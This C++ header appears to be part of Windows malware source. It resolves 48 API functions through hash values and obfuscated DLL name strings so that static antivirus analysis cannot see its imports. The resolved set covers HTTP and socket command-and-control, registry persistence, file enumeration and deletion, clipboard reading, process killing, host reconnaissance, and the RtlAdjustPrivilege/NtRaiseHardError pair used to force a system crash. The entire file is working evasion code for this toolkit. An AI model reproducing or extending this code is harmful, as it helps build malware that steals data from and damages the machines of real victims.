#pragma once

#include "Resolve.h"

class Hashing {
public:
	static void ApiHashLookup()
	{
		const char* wininetDll = AY_OBFUSCATE("wininet.dll");
		const char* ntdllDll = AY_OBFUSCATE("ntdll.dll");
		const char* advapiDll = AY_OBFUSCATE("advapi32.dll");
		const char* kernel32Dll = AY_OBFUSCATE("Kernel32.dll");
		const char* shlwapiDll = AY_OBFUSCATE("Shlwapi.dll");
		const char* user32Dll = AY_OBFUSCATE("User32.dll");
		const char* netapi32Dll = AY_OBFUSCATE("netapi32.dll");
		const char* ws2_32Dll = AY_OBFUSCATE("ws2_32.dll");

		RESOLVE_TABLE rtExampleTbl = {
			{
				{0xB41BC329, wininetDll, NULL},		// InternetOpenA
				{0xD1216B5B, wininetDll, NULL},		// InternetConnectA
				{0x2D9533F5, wininetDll, NULL},		// HttpOpenRequestA
				{0xD95C758D, wininetDll, NULL},		// HttpSendRequestA
				{0xBB1B1683, wininetDll, NULL},		// InternetCloseHandle
				{0x4723F5CF, ntdllDll, NULL},		// NtQuerySystemInformation
				{0xCB91DCF7, advapiDll, NULL},		// RegSetValueExA
				{0x15041404, advapiDll, NULL},		// RegOpenKeyExA
				{0xAE0CF309, advapiDll, NULL},		// RegCloseKey
				{0xBC8907BD, advapiDll, NULL},		// RegDeleteKeyValueA
				{0x4CA09DE4, kernel32Dll, NULL},	// GetModuleFileNameA
				{0x41D40D85, kernel32Dll, NULL},	// DeleteFileA
				{0xF7A461D7, kernel32Dll, NULL},	// ExitProcess
				{0x91EEAB26, kernel32Dll, NULL},	// FindFirstFileW
				{0x6953D74,  shlwapiDll, NULL},		// PathMatchSpecW
				{0x379D857D, kernel32Dll, NULL},	// FindNextFileW
				{0x2FBFB496, kernel32Dll, NULL},	// FindClose
				{0x238A0878, user32Dll, NULL},		// OpenClipboard
				{0xA96BA6FC, user32Dll, NULL},		// GetClipboardData
				{0x978B46D0, user32Dll, NULL},		// CloseClipboard
				{0xF5C7CDFE, kernel32Dll, NULL},	// OpenProcess
				{0x46CC6235, kernel32Dll, NULL},	// TerminateProcess
				{0x3C11901F, kernel32Dll, NULL},	// CloseHandle
				{0xA154FCF0, kernel32Dll, NULL},	// VirtualAlloc
				{0x82F5A700, kernel32Dll, NULL},	// VirtualFree
				{0x68E9B1B9, kernel32Dll, NULL},	// CopyFileA
				{0x1DFA6109, wininetDll, NULL},		// InternetQueryOptionA
				{0xA5175C6B, wininetDll, NULL},		// InternetSetOptionA
				{0xA455EA09, wininetDll, NULL},		// InternetReadFile
				{0x9E687C1D, kernel32Dll, NULL},	// CreateProcessA
				{0x20EE48D4, ntdllDll, NULL},		// RtlAdjustPrivilege
				{0x404ACB20, ntdllDll, NULL},		// NtRaiseHardError
				{0x969C7342, ws2_32Dll, NULL},		// WSAStartup
				{0xB3649202, ws2_32Dll, NULL},		// getaddrinfo
				{0x4FB7476A, ws2_32Dll, NULL},		// connect
				{0xF32ACEAD, ws2_32Dll, NULL},		// recv
				{0x257CEBA6, ws2_32Dll, NULL},		// closesocket
				{0x385EA022, ws2_32Dll, NULL},		// WSACleanup
				{0xB49D06DA, kernel32Dll, NULL},	// WaitForSingleObject
				{0x735B67BB, ws2_32Dll, NULL},		// WSASocketW
				{0x8BA5EF66, kernel32Dll, NULL},	// CreateThread
				{0x59325EFC, advapiDll, NULL},		// GetUserNameA
				{0x8831BC8D, kernel32Dll, NULL},	// GetSystemInfo
				{0x66C46EA8, kernel32Dll, NULL},	// GetComputerNameA
				{0x9E6C4C,   kernel32Dll, NULL},	// GetCurrentProcessId
				{0x2CC55A0,  advapiDll, NULL},		// OpenProcessToken
				{0x7DEB3C2B, kernel32Dll, NULL},	// GetCurrentProcess
				{0xBED283,	 advapiDll, NULL}		// GetTokenInformation
			}
		};

		// resolve the entire table, set the value to the amount of hashes expected to resolve
		if (resolve_init(&rtExampleTbl, 48))
		{
			// entries for rtExampleTbl start at [0] (don't confuse with uCount)
			hash_InternetOpenA = (_InternetOpenA)rtExampleTbl.reEntries[0].lpAddr;
			hash_InternetConnectA = (_InternetConnectA)rtExampleTbl.reEntries[1].lpAddr;
			hash_HttpOpenRequestA = (_HttpOpenRequestA)rtExampleTbl.reEntries[2].lpAddr;
			hash_HttpSendRequestA = (_HttpSendRequestA)rtExampleTbl.reEntries[3].lpAddr;
			hash_InternetCloseHandle = (_InternetCloseHandle)rtExampleTbl.reEntries[4].lpAddr;
			hash_NtQuerySystemInformation = (_NtQuerySystemInformation)rtExampleTbl.reEntries[5].lpAddr;
			hash_RegSetValueExA = (_RegSetValueExA)rtExampleTbl.reEntries[6].lpAddr;
			hash_RegOpenKeyExA = (_RegOpenKeyExA)rtExampleTbl.reEntries[7].lpAddr;
			hash_RegCloseKey = (_RegCloseKey)rtExampleTbl.reEntries[8].lpAddr;
			hash_RegDeleteKeyValueA = (_RegDeleteKeyValueA)rtExampleTbl.reEntries[9].lpAddr;
			hash_GetModuleFileNameA = (_GetModuleFileNameA)rtExampleTbl.reEntries[10].lpAddr;
			hash_DeleteFileA = (_DeleteFileA)rtExampleTbl.reEntries[11].lpAddr;
			hash_ExitProcess = (_ExitProcess)rtExampleTbl.reEntries[12].lpAddr;
			hash_FindFirstFileW = (_FindFirstFileW)rtExampleTbl.reEntries[13].lpAddr;
			hash_PathMatchSpecW = (_PathMatchSpecW)rtExampleTbl.reEntries[14].lpAddr;
			hash_FindNextFileW = (_FindNextFileW)rtExampleTbl.reEntries[15].lpAddr;
			hash_FindClose = (_FindClose)rtExampleTbl.reEntries[16].lpAddr;
			hash_OpenClipboard = (_OpenClipboard)rtExampleTbl.reEntries[17].lpAddr;
			hash_GetClipboardData = (_GetClipboardData)rtExampleTbl.reEntries[18].lpAddr;
			hash_CloseClipboard = (_CloseClipboard)rtExampleTbl.reEntries[19].lpAddr;
			hash_OpenProcess = (_OpenProcess)rtExampleTbl.reEntries[20].lpAddr;
			hash_TerminateProcess = (_TerminateProcess)rtExampleTbl.reEntries[21].lpAddr;
			hash_CloseHandle = (_CloseHandle)rtExampleTbl.reEntries[22].lpAddr;
			hash_VirtualAlloc = (_VirtualAlloc)rtExampleTbl.reEntries[23].lpAddr;
			hash_VirtualFree = (_VirtualFree)rtExampleTbl.reEntries[24].lpAddr;
			hash_CopyFileA = (_CopyFileA)rtExampleTbl.reEntries[25].lpAddr;
			hash_InternetQueryOptionA = (_InternetQueryOptionA)rtExampleTbl.reEntries[26].lpAddr;
			hash_InternetSetOptionA = (_InternetSetOptionA)rtExampleTbl.reEntries[27].lpAddr;
			hash_InternetReadFile = (_InternetReadFile)rtExampleTbl.reEntries[28].lpAddr;
			hash_CreateProcessA = (_CreateProcessA)rtExampleTbl.reEntries[29].lpAddr;
			hash_RtlAdjustPrivilege = (_RtlAdjustPrivilege)rtExampleTbl.reEntries[30].lpAddr;
			hash_NtRaiseHardError = (_NtRaiseHardError)rtExampleTbl.reEntries[31].lpAddr;
			hash_WSAStartup = (_WSAStartup)rtExampleTbl.reEntries[32].lpAddr;
			hash_getaddrinfo = (_getaddrinfo)rtExampleTbl.reEntries[33].lpAddr;
			hash_connect = (_connect)rtExampleTbl.reEntries[34].lpAddr;
			hash_recv = (_recv)rtExampleTbl.reEntries[35].lpAddr;
			hash_closesocket = (_closesocket)rtExampleTbl.reEntries[36].lpAddr;
			hash_WSACleanup = (_WSACleanup)rtExampleTbl.reEntries[37].lpAddr;
			hash_WaitForSingleObject = (_WaitForSingleObject)rtExampleTbl.reEntries[38].lpAddr;
			hash_WSASocketW = (_WSASocketW)rtExampleTbl.reEntries[39].lpAddr;
			hash_CreateThread = (_CreateThread)rtExampleTbl.reEntries[40].lpAddr;
			hash_GetUserNameA = (_GetUserNameA)rtExampleTbl.reEntries[41].lpAddr;
			hash_GetSystemInfo = (_GetSystemInfo)rtExampleTbl.reEntries[42].lpAddr;
			hash_GetComputerNameA = (_GetComputerNameA)rtExampleTbl.reEntries[43].lpAddr;
			hash_GetCurrentProcessId = (_GetCurrentProcessId)rtExampleTbl.reEntries[44].lpAddr;
			hash_OpenProcessToken = (_OpenProcessToken)rtExampleTbl.reEntries[45].lpAddr;
			hash_GetCurrentProcess = (_GetCurrentProcess)rtExampleTbl.reEntries[46].lpAddr;
			hash_GetTokenInformation = (_GetTokenInformation)rtExampleTbl.reEntries[47].lpAddr;
		}
	}
};